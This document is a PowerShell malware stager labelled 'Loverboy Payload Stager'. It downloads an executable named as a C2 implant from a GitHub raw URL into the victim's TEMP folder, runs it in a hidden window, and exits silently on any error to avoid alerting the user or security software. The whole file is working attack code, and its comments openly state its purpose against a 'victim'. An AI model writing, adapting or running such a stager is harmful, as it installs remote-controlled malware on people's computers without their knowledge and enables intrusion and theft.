# ================================================================= #
#               Project: Loverboy Payload Stager (v2)               #
#         Downloads and executes the primary C2 implant.            #
# ================================================================= #

# --- CONFIGURATION ---
# The direct download URL for the final payload executable.
$payloadUrl = "https://raw.githubusercontent.com/Rajesh141414/loverboy/main/DiagTrackRunner.exe"

# The location where the payload will be temporarily saved on the victim's computer.
# Using the TEMP directory is common and less likely to cause permission issues.
$outputPath = "$env:TEMP\DiagTrackRunner.exe"

# --- EXECUTION LOGIC ---
try {
    # Announce the download attempt for debugging (this part won't be seen by the victim).
    # Write-Host "Attempting to download payload from: $payloadUrl"
    
    # Create a new WebClient object to handle the download.
    $webClient = New-Object System.Net.WebClient
    
    # Download the file from the specified URL and save it to the output path.
    $webClient.DownloadFile($payloadUrl, $outputPath)
    
    # Announce successful download.
    # Write-Host "Payload successfully downloaded to: $outputPath"
    
    # Execute the downloaded payload.
    # -WindowStyle Hidden ensures the process runs invisibly to the user.
    # -PassThru can be used to get the process object, but is not needed here.
    Start-Process -FilePath $outputPath -WindowStyle Hidden
    
    # Announce successful execution.
    # Write-Host "Payload executed successfully."
    
} catch {
    # If any part of the try block fails (e.g., download fails, file can't be written),
    # the script will jump here and exit silently to avoid alerting the user or any security software.
    # The error details can be logged for debugging if needed:
    # Write-Host "An error occurred: $_.Exception.Message"
    exit
}
